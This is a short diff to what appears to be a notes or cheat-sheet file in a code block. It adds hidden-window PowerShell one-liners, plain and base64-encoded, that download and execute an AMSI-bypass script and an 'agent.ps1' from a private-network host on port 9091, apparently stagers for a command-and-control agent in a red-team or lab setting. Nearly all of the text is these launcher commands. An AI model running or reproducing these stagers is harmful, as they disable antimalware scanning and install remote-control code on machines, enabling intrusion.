@@ -68,4 +68,9 @@ powershell.exe -NoP -w hidden -c 'iex(iwr http://192.168.110.51:9091/amsibypass.
 powershell.exe -NoP -w hidden -e aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMQAwAC4ANQAxADoAOQAwADkAMQAvAGEAbQBzAGkAYgB5AHAAYQBzAHMALgB0AHgAdAAgAC0AdQBzAGUAYgApADsAIABpAGUAeAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAxADAALgA1ADEAOgA5ADAAOQAxAC8AYQBnAGUAbgB0AC4AcABzADEAIAAtAHUAcwBlAGIAKQA=
 
 
+powershell.exe -NoP -w hidden -c 'iex(iwr http://192.168.110.55:9091/amsibypass.txt -useb); iex(iwr http://192.168.110.55:9091/agent.ps1 -useb)'
+
+powershell.exe -NoP -w hidden -e aWV4KGl3ciBodHRwOi8vMTkyLjE2OC4xMTAuNTU6OTA5MS9hbXNpYnlwYXNzLnR4dCAtdXNlYik7IGlleChpd3IgaHR0cDovLzE5Mi4xNjguMTEwLjU1OjkwOTEvYWdlbnQucHMxIC11c2ViKQ==
+
+
 ```
